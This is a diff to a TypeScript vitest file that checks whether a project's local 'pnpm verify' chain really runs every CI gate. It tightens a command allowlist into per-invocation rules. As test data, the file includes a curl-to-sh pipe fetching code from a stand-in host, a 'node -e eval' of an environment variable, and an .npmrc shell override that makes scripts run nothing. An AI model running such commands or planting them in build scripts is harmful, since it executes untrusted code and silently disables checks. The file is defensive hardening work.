+ * `cargo` gates — which {@link chainOf} expands to twenty-four commands, every
+ * one of them parsed, gating and reached. It satisfied every row, ran nothing,
+ * and exited 0. It was **141/141 green**, twice, on the tree that shipped after
  * round two.
  *
+ * ### Defect eighteen: the net was one token wide
+ *
+ * Round three's fix for thirteen was a list of seven **program names**, and its
+ * doc said each entry named the fact that "this program runs, returns an exit
+ * status, and hands control on, **and what it runs is written in this
+ * repository**". A name in the program position cannot carry that fact, because
+ * the fact is a property of the *invocation*. Measured on the tree that shipped
+ * after round three, twice: prefixing
+ *
+ *     pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" &&
+ *       node -e "eval(process.env.PROBE||'')" &&
+ *
+ * to the shipped chain was `172 passed (172)`, exit 0 twice — while the
+ * byte-equivalent `sh -c "…"` written with `sh` in the program position was
+ * `1 failed | 171 passed (172)`, exit 1 twice, with the message that names the
+ * property being violated ("runs text that is not in this repository"). Both programs were on the list; `sh`, `eval`, a pipe into `sh`
+ * and code taken from the environment were all in the chain, all parsed, all
+ * gating and reached. One invocation, two spellings, opposite verdicts, inside
+ * the function round three added to close exactly that — the same substitution
+ * of a **textual** question for a **referential** one as defect five's prefix
+ * test, defect six's `matches.test(VERIFY)` and defect eleven's `./` test.
+ *
+ * So an entry is now a program **and a predicate over its argument list**, and
+ * the fact it names is about the command rather than about the token:
+ * `node <path in this repository>` is a different fact from `node -e <text>`,
+ * and `pnpm <script in the root manifest>` is a different fact from
+ * `pnpm exec <anything>`. A command whose program is listed and whose arguments
+ * no entry accepts is refused exactly as an unlisted program is, and says which.
+ *
  * "Stricter" is about which *gates* verify runs, and this list does not
- * constrain that. It constrains which *programs* may appear in the chain at
- * all, and the fact each entry names is the one thing every row above assumes
- * without ever checking it: **this program runs, returns an exit status, and
- * hands control to the next command, and what it runs is written in this
- * repository.** A program that is not on the list is refused whether it ends
- * the chain (`exit`, `return`), replaces it (`exec`), changes how a failure
- * propagates through it (`set -e`, `set +e`, `trap`), runs text that is not in
- * this file (`eval`, `source`, `.`, `sh`, `bash`, `cmd`), or merely stands
- * where a gate should be (`true`, `:`, `false`). The point of an allowlist
- * rather than a list of those is that a spelling nobody thought of is refused
- * instead of admitted; a list of builtins is the shape this file has lost to
- * every round. That is the same inversion defect eleven made to
- * {@link refuseUses}.
+ * constrain that. It constrains which *invocations* may appear in the chain at
+ * all. An invocation that is not accepted is refused whether it ends the chain
+ * (`exit`, `return`), replaces it (`exec`), changes how a failure propagates
+ * through it (`set -e`, `set +e`, `trap`), runs text that is not in this
+ * repository (`eval`, `source`, `.`, `sh`, `bash`, `cmd`, `node -e`,
+ * `pnpm exec`), or merely stands where a gate should be (`true`, `:`, `false`).
+ * The point of an allowlist rather than a list of those is that a spelling
+ * nobody thought of is refused instead of admitted; a list of builtins is the
+ * shape this file has lost to every round. That is the same inversion defect
+ * eleven made to {@link refuseUses}.
  *
- * `cd` is the one entry that is not an external program. It is a builtin that
- * runs, returns, and continues — it changes the working directory, which changes
- * what the commands after it do and is disclosed in the header's
- * `working-directory` bullet as something this file does not model.
+ * `cd` is the one entry that is not an external program, and it is also the one
+ * that falsifies a claim every other entry depends on — see
+ * {@link VerifyCommand.rebound}.
  *
- * The cost is that adding a program to a `verify` script reddens this file. That
- * is the same price {@link SETUP_COMMANDS} charges for the apt package list, and
- * for the same reason: a new program in the local gate is a thing to read.
+ * What an accepted invocation still does not bound, said so nobody over-reads
+ * it: the *arguments* a listed script is handed. `node scripts/run-bash.mjs X`
+ * names a program that is in this repository and says nothing about `X`, in
+ * exactly the way the header's first "cannot see" bullet says a gate's argument
+ * list is pinned and its definition is not.
  *
- * Read by *every command "pnpm verify" runs is one this reader can classify*,
- * through {@link unclassifiedVerifyCommands}, and by nothing else.
+ * The cost is that adding a program, or a new argument shape for one already
+ * here, reddens this file. That is the same price {@link SETUP_COMMANDS} charges
+ * for the apt package list, and for the same reason: a new invocation in the
+ * local gate is a thing to read.
+ *
+ * Read in two places, both inside {@link unclassifiedVerifyCommands}'s reach:
+ * {@link acceptsInvocation}, which asks whether any entry takes the command, and
+ * the failure branch beside it, which lists the shapes an entry does cover for
+ * the message. Four cases call `unclassifiedVerifyCommands`: *every command
+ * "pnpm verify" runs is one this reader can classify* over the real chain, and
+ * *does not accept an invocation it has never been told runs and returns*, the
+ * four *defect eighteen* rows, and *a pnpm script name behind a cd binds to a
+ * manifest nobody read* over hand-built ones.
  */
-const VERIFY_PROGRAMS: readonly string[] = ['pnpm', 'node', 'cargo', 'tsc', 'vite', 'vitest', 'cd'];
+interface VerifyInvocation {
+  readonly program: string;
+  /** The argument shape this entry covers, for the failure message. */
+  readonly shape: string;
+  readonly accepts: (command: ParsedCommand) => boolean;
+}
+
+const VERIFY_INVOCATIONS: readonly VerifyInvocation[] = [
+  // `pnpm <name>` where the name is a key in the ROOT manifest's `scripts`. That
+  // is the only pnpm invocation `chainOf` can follow into a body it has read, so
+  // it is the only one whose text this reader can say anything about. It refuses
+  // `pnpm exec <program>` and `pnpm dlx <package>`, which run a program nobody
+  // here named, and `pnpm install`, which runs whatever the lifecycle keys say
+  // (see {@link LIFECYCLE_SCRIPTS}).
+  {
+    program: 'pnpm',
+    shape: 'pnpm <script in the root package.json> (or "pnpm run <script>")',
+    accepts: (command) => {
+      const script = pnpmScript(command);
+      return script !== undefined && runsPnpm(command, script);
+    },
+  },
+  // `node <path in this repository>`. The fact is that the text node executes is
+  // a file in this tree; `node -e <text>` and `node --eval=<text>` have no such
+  // file and are refused. Everything after the path is data to that script.
+  {
+    program: 'node',
+    shape: 'node <path in this repository> [arguments]',
+    accepts: (command) => command.args.length > 0 && repositoryPath(command.args[0] ?? '') !== undefined,
+  },
+  // `cargo <subcommand>`. A subcommand is a name cargo resolves; a first
+  // argument that is a flag is not one.
+  {
+    program: 'cargo',
+    shape: 'cargo <subcommand> [arguments]',
+    accepts: (command) => command.args.length > 0 && !isFlag(command.args[0] ?? ''),
+  },
+  // `tsc` with flags only. This repository runs `tsc --build --force`; a bare
+  // word here would be a file list, which is a different compilation.
+  { program: 'tsc', shape: 'tsc [flags]', accepts: (command) => command.args.every(isFlag) },
+  // `vite build`, which is the only vite invocation in the chain. `vite dev`
+  // starts a server that never returns, which is the opposite of the fact every
+  // row above assumes.
+  {
+    program: 'vite',
+    shape: 'vite build [flags or paths in this repository]',
+    accepts: (command) => command.args[0] === 'build' && everyArgumentIsFlagOrPath(command.args.slice(1)),
+  },
+  // `vitest run …`. Bare `vitest` is the watcher and does not return either.
+  // A `--config` argument must name a file that is here, which is the same
+  // referential question asked of `node`'s first argument.
+  {
+    program: 'vitest',
+    shape: 'vitest run [flags or paths in this repository]',
+    accepts: (command) => command.args[0] === 'run' && everyArgumentIsFlagOrPath(command.args.slice(1)),
+  },
+  // `cd <directory in this repository>`. It runs, returns and continues — and it
+  // rebinds every `pnpm <name>` behind it, which is why accepting it here is not
+  // the end of the question. See {@link VerifyCommand.rebound}.
+  {
+    program: 'cd',
+    shape: 'cd <directory in this repository>',
+    accepts: (command) => command.args.length === 1 && repositoryPath(command.args[0] ?? '') !== undefined,
+  },
+];
+
+/**
+ * The {@link VerifyInvocation} that accepts this command, or `undefined`.
+ *
+ * Separated from {@link unclassifiedVerifyCommands} so that "no entry has this
+ * program" and "an entry has this program and not these arguments" are one
+ * lookup with two answers, which is what lets the failure message print the
+ * shape the entry does cover.
+ *
+ * Load-bearing, measured on the tree this comment ships in, twice: dropping
+ * `entry.accepts(command)` so this goes back to round three's program-token test
+ * is `5 failed | 176 passed (181)`, exit 1 twice — the four *defect eighteen*
+ * rows and the control beside them.
+ */
+function acceptsInvocation(command: ParsedCommand): VerifyInvocation | undefined {
+  return VERIFY_INVOCATIONS.find((entry) => entry.program === command.program && entry.accepts(command));
+}
 
 /**
  * Every command in the workflows that is a *gate* — something that can fail the
@@ -708,9 +1245,15 @@ const CI_GATES: readonly CiGate[] = [
   { ci: 'pnpm test:transcripts', runs: (c) => runsPnpm(c, 'test:transcripts') },
   { ci: 'cargo build --workspace --locked', runs: (c) => invokes(c, 'cargo', 'build', '--workspace', '--locked') },
   { ci: 'cargo test --workspace --locked', runs: (c) => invokes(c, 'cargo', 'test', '--workspace', '--locked') },
-  // Two rows, two different scripts. The old `matches: /secret-scan\.sh/` was
-  // satisfied by the `.test.sh` command as well, so one of these rows was
-  // proving nothing. `runsScript` compares the script path exactly.
+  // Two rows, two different scripts, and `runsScript` compares the script path
+  // exactly rather than searching for it. A previous version of this comment
+  // said the old `matches: /secret-scan\.sh/` was "satisfied by the `.test.sh`
+  // command as well, so one of these rows was proving nothing", and that is
+  // false in both halves: the escaped dot demands the bytes `secret-scan.sh`,
+  // which do not occur inside `scripts/secret-scan.test.sh`, and the old reader
+  // tested the regex against the whole concatenated splat, where the genuine
+  // `scripts/secret-scan.sh` occurrence satisfied it. Each row was satisfied by
+  // its own distinct command then, and is now.
   { ci: './scripts/secret-scan.test.sh', runs: (c) => runsScript(c, 'scripts/secret-scan.test.sh') },
   { ci: './scripts/secret-scan.sh', runs: (c) => runsScript(c, 'scripts/secret-scan.sh') },
 ];
@@ -804,27 +1347,42 @@ describe('the local gate is a superset of the remote one', () => {
     // asks whether a gate is *present* in the chain and whether the operators
     // around it let its exit status through. Not one of them asks whether the
     // chain ever gets there. `"verify": "exit 0 && <the whole shipped chain>"`
-    // is twelve real, parsed, gating `pnpm` invocations in the program
-    // position; `pnpm verify` then runs none of them and exits 0. Measured on
-    // the tree that shipped after round two, twice: 141/141 green. It is defect
-    // six's own headline construction — `"verify": "echo \"CI still runs …\""` —
-    // one level down, against the reader built to kill it.
+    // is a `verify` body of twelve top-level simple commands — `exit 0`, eight
+    // `pnpm <script>` invocations, `cd src-tauri` and two `cargo` gates — which
+    // `chainOf` expands to twenty-four commands, every one parsed, gating and
+    // reached, of which `pnpm verify` runs none. Measured on the tree that
+    // shipped after round two, twice: 141/141 green. It is defect six's own
+    // headline construction — `"verify": "echo \"CI still runs …\""` — one level
+    // down, against the reader built to kill it.
     //
-    // `exit` was not the hole. The hole was that a program this reader had never
-    // heard of was assumed to run and return, so the fix is an allowlist and not
-    // a list of control-flow builtins: see VERIFY_PROGRAMS. Establishing what
-    // three shells do with the construction, without invoking pnpm or verify:
-    // `sh -c 'exit 0 && echo GATE_RAN'`, `bash -c '…'` and `cmd //c "…"` each
-    // printed nothing and exited 0.
+    // (Those four counts — 24 chain entries, 24 gating, 12 top level, 8 of them
+    // `pnpm` — are this round's, printed by `chainOf` on the tree this comment
+    // ships in with `exit 0 && ` spliced onto the front of the real `verify`
+    // body. The shipped chain itself is 23 entries and 11 top-level commands.
+    // The previous version of this comment called the same construction "twelve
+    // real, gating `pnpm` invocations" here and in VERIFY_PROGRAMS' doc, and
+    // "thirteen real gating invocations" in the header: twelve is the count of
+    // top-level commands of any program, eight is the count of `pnpm` ones, and
+    // thirteen was nothing the tree returns.)
+    //
+    // `exit` was not the hole. The hole was that an invocation this reader had
+    // never been told about was assumed to run and return, so the fix is an
+    // allowlist and not a list of control-flow builtins: see
+    // VERIFY_INVOCATIONS. Establishing what three shells do with the
+    // construction, without invoking pnpm or verify — re-run on this tree:
+    // `sh -c 'exit 0 && echo GATE_RAN'` (SH_EXIT=0), the same under `bash -c`
+    // (BASH_EXIT=0) and under `cmd //c` (CMD_EXIT=0) each printed nothing.
     expect(
       unclassifiedVerifyCommands(VERIFY_CHAIN),
-      'a command in the "pnpm verify" chain invokes a program this reader cannot ' +
+      'a command in the "pnpm verify" chain is an invocation this reader cannot ' +
         'classify. Every row above assumes each command runs, returns an exit ' +
-        'status and hands control on — and one that does not (it ends the chain, ' +
-        'replaces it, changes how failure propagates through it, or runs text ' +
-        'that is not in this repository) makes every gate listed behind it ' +
-        'unproven while every row above stays green. Add the program to ' +
-        'VERIFY_PROGRAMS once you have decided it is an ordinary invocation.',
+        'status and hands control on, and that the text it runs is in this ' +
+        'repository — and one that does not (it ends the chain, replaces it, ' +
+        'changes how failure propagates through it, runs text that is not in ' +
+        'this repository, or names a script in a package.json nobody here read) ' +
+        'makes every gate listed behind it unproven while every row above stays ' +
+        'green. Add the invocation to VERIFY_INVOCATIONS once you have decided ' +
+        'it is an ordinary one.',
     ).toEqual([]);
   });
 
@@ -879,8 +1437,13 @@ describe('the local gate is a superset of the remote one', () => {
     // are listed gates, and every row above went on asserting "CI runs pnpm
     // test:harness" about a step whose failure CI would ignore.
     //
-    // The readers of `WorkflowCommand.gating` and `WorkflowCommand.reached` are
-    // this case and only this case.
+    // The readers of `WorkflowCommand.gating` and `WorkflowCommand.reached`
+    // are this case, through `unenforcedGates`; *a gate that cannot fail, or
+    // that does not run, is caught — defects ten and twelve*, which calls the
+    // same function on hand-built commands four times; and *carries the gating
+    // flag from the parsed step into the command list*, which asserts on the
+    // two fields directly. A previous version of this comment said "this case
+    // and only this case", written in the same commit as the other two.
     //
     // The `reached` half is defect twelve, and it is the other side of the
     // same `||`. Defect ten closed the LEFT of it — a gate there has its exit
@@ -1434,6 +1997,43 @@ describe('the workflow is read as a document, not as lines', () => {
       );
     });
 
+    it('an env: on a uses: step is the with: pin written the other way — defect twenty-one', () => {
+      // Defect twenty-one. GitHub hands a `with:` input to an action as the
+      // environment variable INPUT_<NAME>, so this is one channel with two
+      // spellings and the pin read one of them. Measured on the tree that
+      // shipped after round three, twice: `env: INPUT_RUN_INSTALL:` on the
+      // pinned `pnpm/action-setup@v4` step of `static` was `172 passed (172)`,
+      // exit 0, while the byte-equivalent `with: run_install:` on the identical
+      // step took that file down at module load, exit 1 twice, by name.
+      //
+      // Whether the runner really consumes it that way was NOT established here,
+      // and the refusal does not turn on it: the reader has no fact either way,
+      // and the header's rule for that case is a refusal rather than a guess in
+      // the quiet direction.
+      expect(
+        probe(
+          '      - uses: pnpm/action-setup@v4',
+          '        env:',
+          '          INPUT_RUN_INSTALL: --frozen-lockfile',
+          '        with:',
+          '          version: 10',
+        ),
+      ).toThrow('spelled the other way: INPUT_RUN_INSTALL');
+
+      // Not a list of one prefix: any `env:` on a `uses:` step is refused, for
+      // the reason VERIFY_INVOCATIONS gives for being an allowlist.
+      expect(probe('      - uses: actions/checkout@v4', '        env:', '          ANYTHING: 1')).toThrow(
+        'sets "env:" on a step whose work is "actions/checkout@v4"',
+      );
+
+      // The control, and it is the boundary this refusal is drawn at: `env:` on
+      // a `run:` step is untouched, because that step's text is compared with
+      // CI_GATES by equality and the header discloses what an `env:` can still
+      // do to it. Without this row the two above pass for a reader that refuses
+      // every `env:`.
+      expect(probe('      - run: pnpm test', '        env:', '          ANYTHING: 1')).not.toThrow();
+    });
+
     it('refuses a job-level secrets:, instead of listing it as known and reading nothing', () => {
       const text = [
         'jobs:',
@@ -1729,16 +2329,19 @@ describe('a local uses: is judged against the files the enumeration really read'
   // `modelOf` a set assembled by hand, so all of them stay green under a
   // `readWorkflowSurface` that passes the wrong set. Re-measured on the tree
   // this comment ships in, twice each, exit 1 twice each: replacing the
-  // enumeration with `new Set<string>()` is `1 failed | 171 passed (172)`, and
+  // enumeration with `new Set<string>()` is `1 failed | 180 passed (181)`, and
   // the one red is the first case here — that mutation is invisible to every
   // other case in the file. Dropping the membership test so that any `./` path
-  // is admitted is `18 failed | 154 passed (172)`, and the second case here is
-  // ONE of those eighteen: the other sixteen are hand-set `uses:` cases above,
-  // in *a key is a key whatever its quoting* and *a uses: is refused on what it
-  // names*. The previous version of this comment said "neither mutation is
-  // visible to any case above", which was true of the first and false of the
-  // second, and it was a claim about coverage asserted rather than run — in the
-  // file whose subject is that a comment is not evidence.
+  // is admitted is `18 failed | 163 passed (181)`, and the second case here is
+  // ONE of those eighteen: the other SEVENTEEN are hand-set `uses:` cases above
+  // — 3 in *a key is a key whatever its quoting — defect four* and 14 in *a
+  // uses: is refused on what it names, not on how it is written* — which is
+  // 17 + 1 = 18, read off the failure names of that run. Two earlier versions of
+  // this sentence were wrong about this same measurement, and both are worth
+  // recording because the shape repeated: the first said "neither mutation is
+  // visible to any case above", which was true of the first mutation and false
+  // of the second; the second said "the other sixteen", which did not add up to
+  // the eighteen the same sentence reports.
   //
   // These two run the real `readWorkflowSurface` over a real directory, which is
   // why they build one rather than mocking `node:fs`: a mock would be a third
@@ -2075,15 +2678,15 @@ describe('verify is read as commands that execute, not as text that mentions the
     expect(unenforcedGates(at('sudo apt-get update', false), gates)).toEqual([]);
   });
 
-  it('does not accept a program it has never been told runs and returns', () => {
+  it('does not accept an invocation it has never been told runs and returns', () => {
     // Defect thirteen, asked of the rule directly. The real chain contains only
-    // listed programs, so this rule is invisible to every other case in this
-    // file unless it is handed a chain the tree does not have — which is how a
-    // `verify` side with no totality check at all survived three rounds.
+    // accepted invocations, so this rule is invisible to every other case in
+    // this file unless it is handed a chain the tree does not have — which is
+    // how a `verify` side with no totality check at all survived three rounds.
     const chain = (body: string): VerifyCommand[] => chainOf('probe', { probe: body, typecheck: 'tsc --build --force' });
 
     expect(unclassifiedVerifyCommands(chain('exit 0 && pnpm typecheck'))).toEqual([
-      'probe -> exit 0',
+      'probe -> exit 0 (no entry names the program "exit")',
     ]);
 
     // The construction in full: every gate behind the `exit` is real, parsed,
@@ -2094,6 +2697,197 @@ describe('verify is read as commands that execute, not as text that mentions the
     // The control. Without it the rows above pass for a rule that reports every
     // command, and the shipped chain would be red.
     expect(unclassifiedVerifyCommands(chain('pnpm typecheck'))).toEqual([]);
+  });
+
+  it.each([
+    {
+      what: 'pnpm exec, which runs a program nobody here named',
+      body: 'pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh"',
+      report:
+        'probe -> pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" (arguments outside every ' +
+        'shape listed for "pnpm": pnpm <script in the root package.json> (or "pnpm run <script>"))',
+    },
+    {
+      what: 'node -e, whose text is not a file in this repository',
+      body: 'node -e "eval(process.env.PROBE||\'\')"',
+      report:
+        'probe -> node -e "eval(process.env.PROBE||\'\')" (arguments outside every shape listed for ' +
+        '"node": node <path in this repository> [arguments])',
+    },
+    {
+      what: 'pnpm install, which runs whatever the lifecycle keys say',
+      body: 'pnpm install --frozen-lockfile',
+      report:
+        'probe -> pnpm install --frozen-lockfile (arguments outside every shape listed for "pnpm": ' +
+        'pnpm <script in the root package.json> (or "pnpm run <script>"))',
+    },
+    {
+      what: 'vitest with no subcommand, which watches instead of returning',
+      body: 'vitest',
+      report:
+        'probe -> vitest (arguments outside every shape listed for "vitest": vitest run [flags or paths ' +
+        'in this repository])',
+    },
+  ])('refuses $what — defect eighteen', ({ body, report }) => {
+    // Defect eighteen. Round three's net was a list of seven program NAMES, and
+    // its doc said each entry named the fact that what the program runs "is
+    // written in this repository" — a property of the invocation, asserted about
+    // the token. Every body here has a listed program in the program position.
+    // Measured on the tree that shipped after round three, twice each: the
+    // first two prefixed to the shipped chain were `172 passed (172)`, exit 0,
+    // while the byte-equivalent `sh -c "…"` with `sh` in the program position
+    // was `1 failed | 171 passed (172)`, exit 1. One invocation, two spellings,
+    // opposite verdicts.
+    expect(unclassifiedVerifyCommands(chainOf('probe', { probe: body }))).toEqual([report]);
+  });
+
+  it('accepts the argument shapes the shipped chain really uses — the control', () => {
+    // Without this the four rows above pass for a rule that refuses everything,
+    // and the shipped chain would be red. Each of these is a command that is
+    // really in VERIFY_CHAIN, asked of the classifier on its own.
+    for (const text of [
+      'pnpm typecheck',
+      'pnpm run typecheck',
+      'node scripts/run-bash.mjs scripts/secret-scan.sh',
+      'cargo build --workspace --locked',
+      'tsc --build --force',
+      'vite build',
+      'vitest run',
+      'vitest run --config tests/harness/mock-provider/vitest.config.ts',
+      'cd src-tauri',
+    ]) {
+      expect(acceptsInvocation(parseCommand(text)), `"${text}" is in the shipped chain`).toBeDefined();
+    }
+
+    // And the referential half of it: `node <path>` is accepted because the path
+    // is here, not because it is spelled like one.
+    expect(acceptsInvocation(parseCommand('node scripts/no-such-file.mjs'))).toBeUndefined();
+    expect(repositoryPath('scripts/run-bash.mjs')).toBe('scripts/run-bash.mjs');
+    expect(repositoryPath('../outside/gate.mjs')).toBeUndefined();
+    expect(repositoryPath('scripts/no-such-file.mjs')).toBeUndefined();
+  });
+
+  it('a pnpm script name behind a cd binds to a manifest nobody read — defect nineteen', () => {
+    // Defect nineteen. `chainOf`'s edge is the sentence every row above rests
+    // on: "`pnpm typecheck` runs the body of `scripts.typecheck` in the root
+    // package.json". `cd` was on round three's allowlist, admitted with a
+    // comment saying it "changes what the commands after it do", and the edge
+    // was followed anyway. Measured on the tree that shipped after round three,
+    // twice: a `verify` of `cd probe && pnpm typecheck && …` beside a
+    // probe manifest whose scripts are `node -e ""` was `172 passed
+    // (172)`, exit 0, with every gate row satisfied against bodies that do not
+    // run — while renaming one of those invocations to a name only `probe`'s
+    // manifest declares, which changes nothing about what executes, was
+    // `1 failed | 171 passed (172)`, exit 1 twice.
+    const chain = chainOf('probe', {
+      probe: 'cd src-tauri && pnpm typecheck',
+      typecheck: 'tsc --build --force',
+    });
+
+    // The edge is not followed: the root manifest's body is not in the chain.
+    expect(chain.map((e) => e.command.text)).toEqual(['cd src-tauri', 'pnpm typecheck']);
+    expect(chain.map((e) => e.rebound)).toEqual([false, true]);
+    expect(unclassifiedVerifyCommands(chain)).toEqual([
+      'probe -> pnpm typecheck (a "cd" runs in front of it, so which package.json this name binds to ' +
+        'is not written here)',
+    ]);
+
+    // The control, one `cd` removed and nothing else changed: the same name, the
+    // same manifest, and now the edge is followed into `typecheck`'s body.
+    const rooted = chainOf('probe', { probe: 'pnpm typecheck', typecheck: 'tsc --build --force' });
+    expect(rooted.map((e) => e.command.text)).toEqual(['pnpm typecheck', 'tsc --build --force']);
+    expect(unclassifiedVerifyCommands(rooted)).toEqual([]);
+
+    // It composes downwards and not upwards, which is what a shell does: a `cd`
+    // inside an invoked script is gone when that script returns, so the second
+    // `pnpm build` here is not rebound.
+    const nested = chainOf('probe', {
+      probe: 'pnpm lint:rust && pnpm build',
+      'lint:rust': 'cd src-tauri && cargo fmt --all --check',
+      build: 'vite build',
+    });
+    expect(nested.filter((e) => e.command.text === 'pnpm build').map((e) => e.rebound)).toEqual([false]);
+    expect(nested.some((e) => e.command.text === 'vite build')).toBe(true);
+    expect(unclassifiedVerifyCommands(nested)).toEqual([]);
+
+    // And downwards: a script invoked after a `cd` cannot be resolved either.
+    const inherited = chainOf('probe', {
+      probe: 'cd src-tauri && pnpm build',
+      build: 'vite build',
+    });
+    expect(inherited.some((e) => e.command.text === 'vite build')).toBe(false);
+  });
+
+  it('the setup exemption for "pnpm install" covers no work of its own', () => {
+    // Defect seventeen. SETUP_COMMANDS exempts `pnpm install --frozen-lockfile`
+    // — run in three CI jobs and in no `pnpm verify` — and used to justify that
+    // with "cannot fail on the state of the tree". `pnpm install` also runs the
+    // root package's lifecycle scripts, and `chainOf` starts at `verify` and has
+    // no notion of that edge, so a body written under one of these keys is CI
+    // work no local run reaches. Measured in a scratch package on pnpm 10.33.0:
+    // a `postinstall` exiting 1 made `pnpm install --frozen-lockfile` exit 1
+    // with ` ELIFECYCLE  Command failed with exit code 1.`; with both succeeding
+    // it ran `postinstall` and then `prepare` and exited 0, while `pnpm verify`
+    // in the same package ran neither.
+    // Asked of the rule on input the tree does not have, first — the real
+    // manifest declares none of these, so the assertion below is satisfied by a
+    // filter that reports nothing at all.
+    expect(lifecycleScriptsIn({ postinstall: 'node probe.mjs', prepare: 'x', test: 'vitest run' })).toEqual([
+      'postinstall',
+      'prepare',
+    ]);
+    expect(lifecycleScriptsIn({ test: 'vitest run', build: 'vite build' })).toEqual([]);
+
+    expect(
+      lifecycleScriptsIn(PACKAGE.scripts),
+      'package.json declares a script that pnpm runs on its own, at every ' +
+        '`pnpm install` — which CI does in three jobs and `pnpm verify` does in ' +
+        'none. SETUP_COMMANDS exempts that install as setup, so a gate written ' +
+        'here is CI work every check above would report as covered. Decide where ' +
+        'the work belongs: in the verify chain, in a workflow step of its own, ' +
+        'or nowhere.',
+    ).toEqual([]);
+  });
+
+  it('the shell that reads a script body is one this reader assumed', () => {
+    // Defect twenty, and the verify side's `defaults.run.shell`. Every command
+    // in this chain is split on POSIX `&&`, `||`, `;` and `|` by
+    // `shellCommands`; what actually interprets those bytes is pnpm's
+    // `script-shell`, which lives in this repository's tracked `.npmrc`. Before
+    // this round the token `npmrc` occurred zero times in this file. Measured on
+    // the tree that shipped after round three, twice: appending
+    // `script-shell=C:/Program Files/Git/usr/bin/true.exe` to `.npmrc`, with
+    // `package.json` and `ci.yml` byte-identical, was `172 passed (172)`, exit 0
+    // — a tree in which `pnpm verify` and CI's own `pnpm test` step both execute
+    // nothing.
+    //
+    // The module-load call is the real assertion; these two ask the rule about
+    // input the tree does not have, which is the lesson of every other named
+    // function in this file.
+    expect(SHELL_SETTINGS).toEqual(['.npmrc']);
+
+    const withNpmrc = (text: string): (() => unknown) => {
+      const root = mkdtempSync(join(tmpdir(), 'verify-npmrc-'));
+      writeFileSync(join(root, '.npmrc'), text, 'utf8');
+      return () => {
+        try {
+          return refuseScriptInterpretation(root);
+        } finally {
+          rmSync(root, { recursive: true, force: true });
+        }
+      };
+    };
+
+    expect(withNpmrc('script-shell=C:/Program Files/Git/usr/bin/true.exe\n')).toThrow(/script-shell/u);
+    expect(withNpmrc('shell-emulator=true\n')).toThrow(/"shell-emulator"/u);
+    // The default refusal, not a list of two spellings: a key nobody thought of
+    // is refused the same way. That is the shape defect eleven inverted.
+    expect(withNpmrc('some-setting-nobody-listed=1\n')).toThrow(/"some-setting-nobody-listed"/u);
+
+    // The controls. Without them the three rows above pass for a reader that
+    // refuses every `.npmrc`, and the tracked one would take this file down.
+    expect(withNpmrc('# a comment\n\nstrict-peer-dependencies=false\nauto-install-peers=true\n')).not.toThrow();
+    expect(withNpmrc('')()).toEqual(['.npmrc']);
   });
 
   it('a gate on the right of a || is present, gating, and not reached — defect twelve', () => {
@@ -2458,8 +3252,14 @@ interface ShellCommand {
   readonly text: string;
   /**
    * False when a shell operator swallows this command's exit status: it is on
-   * the left of a `||`, or in front of a `;`, or upstream in a `|`. Read by the
-   * `verify reaches the CI gate` case, which is the whole of defect six.
+   * the left of a `||`, or in front of a `;`, or upstream in a `|`.
+   *
+   * Copied out by {@link commandsOf} onto {@link WorkflowCommand.gating} and by
+   * {@link chainOf} onto {@link VerifyCommand.gating}, which are what the cases
+   * read; the case that decides what it is for is `verify reaches the CI gate`,
+   * which is the whole of defect six. It is also asserted on directly, as it
+   * comes off {@link shellCommands}, by the seven rows of *knows which commands
+   * in $shape can fail the run*.
    */
   readonly gating: boolean;
   /**
@@ -2473,9 +3273,12 @@ interface ShellCommand {
    * succeeds, `b` is skipped and the run is **green**, so a gate written there
    * is one this reader would report as run when it was not.
    *
-   * Read by *every CI gate runs, and can fail the job it is listed in* on the
-   * workflow side, and by the `verify reaches the CI gate` case on the verify
-   * side, which demands `gating && reached`.
+   * Carried the same way {@link ShellCommand.gating} is: onto
+   * {@link WorkflowCommand.reached} by {@link commandsOf}, where *every CI gate
+   * runs, and can fail the job it is listed in* reads it, and onto
+   * {@link VerifyCommand.reached} by {@link chainOf}, where the `verify reaches
+   * the CI gate` case demands `gating && reached`. Asserted on directly by the
+   * seven rows of *knows which commands in $shape a green run executes*.
    */
   readonly reached: boolean;
 }
@@ -2767,7 +3570,9 @@ interface WorkflowCommand {
   /**
    * Whether every green run of the step that carries it executes it — false for
    * a command CI writes on the right of a `||`. Read by
-   * {@link unenforcedGates}.
+   * {@link unenforcedGates}, and asserted on directly by *carries the gating
+   * flag from the parsed step into the command list*, which is the wiring case
+   * for both this field and {@link WorkflowCommand.gating}.
    */
   readonly reached: boolean;
 }
@@ -2877,17 +3682,40 @@ function unenforcedGates(
 }
 
 /**
- * The commands in a verify chain whose program is not one {@link
- * VERIFY_PROGRAMS} names, reported as `script -> command`.
+ * The commands in a verify chain that no {@link VERIFY_INVOCATIONS} entry
+ * accepts, reported as `script -> command (why)`.
  *
  * A named function for the reason {@link unaccounted} is one, and the reason is
- * sharper here: `package.json`'s real chain contains only listed programs, so a
- * rule written inline would only ever see input that satisfies it.
+ * sharper here: `package.json`'s real chain contains only accepted invocations,
+ * so a rule written inline would only ever see input that satisfies it.
+ *
+ * Three answers, kept apart because they want different fixes. *No entry names
+ * this program* is defect thirteen. *An entry names the program and not these
+ * arguments* is defect eighteen — the totality was one token wide, so
+ * `pnpm exec sh -c "…"` and `node -e "eval(…)"` walked through a net built to
+ * refuse `sh` and `eval`. *This name binds to a manifest nobody read* is defect
+ * nineteen, and it is the only one of the three that is not about the command's
+ * own text at all.
  */
 function unclassifiedVerifyCommands(chain: readonly VerifyCommand[]): string[] {
-  return chain
-    .filter(({ command }) => !VERIFY_PROGRAMS.includes(command.program))
-    .map(({ script, command }) => `${script} -> ${command.text}`);
+  const out: string[] = [];
+  for (const { script, command, rebound } of chain) {
+    const where = `${script} -> ${command.text}`;
+    if (acceptsInvocation(command) === undefined) {
+      const known = VERIFY_INVOCATIONS.filter((entry) => entry.program === command.program);
+      out.push(
+        known.length === 0
+          ? `${where} (no entry names the program "${command.program}")`
+          : `${where} (arguments outside every shape listed for "${command.program}": ` +
+            `${known.map((entry) => entry.shape).join('; ')})`,
+      );
+      continue;
+    }
+    if (rebound && command.program === 'pnpm') {
+      out.push(`${where} (a "cd" runs in front of it, so which package.json this name binds to is not written here)`);
+    }
+  }
+  return out;
 }
 
 function unaccounted(commands: readonly WorkflowCommand[]): string[] {
@@ -3124,6 +3952,7 @@ function modelOf(workflow: Workflow, readWorkflows: ReadonlySet<string>): Workfl
     const jobAction = jobUses === undefined ? undefined : refuseUses(where, line, jobUses, readWorkflows);
     if (jobAction !== undefined) actions.push(jobAction.uses);
